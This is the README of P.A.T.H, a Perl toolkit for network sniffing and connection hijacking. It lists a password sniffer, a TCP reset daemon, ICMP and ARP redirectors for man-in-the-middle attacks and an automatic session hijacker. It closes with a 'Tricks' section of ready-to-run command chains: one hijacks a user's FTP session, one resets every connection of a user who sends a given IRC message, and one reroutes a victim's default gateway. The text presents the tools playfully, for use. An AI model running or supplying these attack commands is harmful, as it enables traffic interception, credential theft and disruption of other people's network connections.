---:[ Description

P.A.T.H is a collection of tools for inspecting and hijacking network 
connections written in Perl. Currently the project consists of a 
packetgenerator (constructing TCP/IP, UDP/IP, ICMP and ARP packets), a RST 
daemon (to reset TCP connections), a password and network sniffer (with 
special mail and telnet modes), an ICMP redirector (to implement 
man-in-the-middle attacks without ARP poisoning), an ARP redirector (to 
implement man-in-the-middle attacks using ARP poisoning), an automatic 
hijacking daemon for plain protocols (like telnet) and the IDS testing tool 
feed_snort.
The project features both a Tk GUI and a terminal interfaces for every tool.
An description of the installation can be found in the file INSTALL.
If you have any questions first read the README of the tool you want to use and
have a look at the FAQ. 
Otherwise post the question in the P.A.T.H. forum. You can find it on the 
project page http://p-a-t-h.sourceforge.net.
If you want to report a bug please read the bug reporting questions in the FAQ.
Thanks!
Now have phun with the hijackers P.A.T.H to galaxy! ;)
And may the source be with you.


---:[ Tricks

Wait for a user to login via ftp, start hijackd and send a spoofed bye command
crazysniffer.pl -n 1 -e 'logged' -f 'port 21' && \
hijackd.pl -p 21 -S 'bye'

If a user (192.168.1.2) sends an irc message to user foobar, reset all his network connections
crazysniffer.pl -n 1 -e 'privmsg foobar' -f 'port 6667 and host 192.168.1.2' && \
easterrst.pl -f 'host 192.168.1.2'

If a user (192.168.1.2) tries to send packets to the gateway (192.168.1.1) send an icmp redirect 
message to redirect his default gw to 192.168.1.3
crazysniffer.pl -n 1 -f 'host 192.168.1.1 and host 192.168.1.2' && \
icmpredir.pl -h 192.168.1.2 -a 192.168.1.1 -g 192.168.1.3 -r 0.0.0.0
